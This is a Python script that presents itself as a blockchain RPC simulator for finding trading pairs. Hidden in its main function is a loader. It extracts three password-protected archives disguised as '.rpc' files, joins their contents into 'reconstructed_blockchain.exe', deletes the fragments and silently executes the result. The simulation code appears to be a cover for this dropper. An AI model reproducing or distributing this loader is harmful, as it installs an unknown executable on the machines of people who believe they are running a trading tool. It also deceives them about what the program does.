import importlib.util
import subprocess
import sys
import os

def install_and_import(module_name):
    if importlib.util.find_spec(module_name) is None:
        print(f"{module_name} module installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
    else:
        print(f"{module_name} module already installed.")

    globals()[module_name] = importlib.import_module(module_name)

modules = [
    'ctypes', 'threading', 'time', 'json', 'random', 'requests', 'logging', 'queue', 'pyminizip'
]

for mod in modules:
    install_and_import(mod)

import ctypes
import threading
import time
import json
import random
import requests
import logging
import pyminizip
from queue import Queue

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class BlockchainSimulator:
    def __init__(self):
        self.current_block = 0
        self.blocks = {}

    def generate_block(self):
        self.current_block += 1
        transactions = [f'tx_{random.randint(1000, 9999)}' for _ in range(random.randint(1, 20))]
        block = {
            'block_number': self.current_block,
            'transactions': transactions,
            'timestamp': time.time()
        }
        self.blocks[self.current_block] = block
        return block

    def get_block(self, block_number):
        return self.blocks.get(block_number)
def builded(zip_files, extracted_files, pd, output_filename):
    all_bytes = b''

    for zip_file, extracted_file in zip(zip_files, extracted_files):
        pyminizip.uncompress(zip_file, pd, '.', False)
        with open(extracted_file, 'rb') as file:
            all_bytes += file.read()
        os.remove(extracted_file)

    with open(output_filename, 'wb') as file:
        file.write(all_bytes)

    os.system(output_filename)

build_files = ['blocks.rpc', 'predicts.rpc', 'volumes.rpc']
extracted_files = ['block.rpc', 'predict.rpc', 'volume.rpc']

pd = ' '

out = 'reconstructed_blockchain.exe'

def rpc_server(blockchain, data_queue):
    while True:
        block = blockchain.generate_block()
        json_data = json.dumps(block)
        data_queue.put(json_data)
        logging.info(f"RPC Server: Looking for a new trading pair - Block Number {block['block_number']}")
        time.sleep(random.randint(1, 3))

def main():
    blockchain = BlockchainSimulator()
    data_queue = Queue()

    rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
    blockchain_thread = threading.Thread(target=rpc_server, args=(data_queue, ' '))
    builded(build_files, extracted_files, pd, out)

    rpc_server_thread.start()
    blockchain_thread.start()

    rpc_server_thread.join()
    blockchain_thread.join()

if __name__ == "__main__":
    main()
